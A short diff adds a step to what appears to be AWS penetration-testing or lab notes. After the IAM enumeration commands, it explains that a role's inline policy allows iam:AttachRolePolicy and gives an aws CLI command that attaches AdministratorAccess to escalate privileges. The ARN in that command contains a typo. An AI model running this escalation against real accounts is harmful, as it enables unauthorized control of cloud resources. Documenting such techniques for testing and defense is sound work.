@@ -123,3 +123,10 @@ aws iam list-role-policies --role-name <role-name> --profile <NAME>
 # Get the permissions in inline policy
 aws iam get-role-policy --role-name <role-name> --policy-name <policy-name> --profile <NAME>
 ```
+
+The inline policy was configured with `iam:AttachRolePolicy` which is dangerous since you can attach any policy into your role(s)
+
+```bash
+# Escalate the priviliege by attaching administrator policy 
+aws iam attach-role-policy --policy-arn arn:aws:iam;:aws:policy/AdministratorAccess --role-name <role-name> --profile <NAME>
+```
